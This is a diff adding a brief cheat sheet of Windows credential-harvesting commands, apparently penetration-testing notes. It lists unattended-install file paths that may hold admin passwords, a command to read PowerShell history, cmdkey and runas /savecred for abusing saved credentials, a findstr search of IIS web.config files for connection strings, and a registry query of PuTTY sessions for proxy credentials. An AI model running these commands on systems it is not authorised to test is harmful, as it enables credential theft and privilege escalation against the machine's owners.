@@ -1,0 +1,37 @@
+//places for default administrations credentials for unattend installation of windows 
+
+    C:\Unattend.xml
+    C:\Windows\Panther\Unattend.xml
+    C:\Windows\Panther\Unattend\Unattend.xml
+    C:\Windows\system32\sysprep.inf
+    C:\Windows\system32\sysprep\sysprep.xml
+
+// powershell history 
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+ // the above command is for cmd.exe
+
+
+ //saved window credentials 
+
+ cmdkey /list
+
+ runas /savecred /usr:{anyuser} cmd.exe
+
+
+ // iis configuration {web.config} 
+ path 
+ C:\inetpub\wwwroot\web.config
+ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+
+ command :
+ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+
+ //find credentials using putty from registory 
+
+ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+ 
+
+
+//end
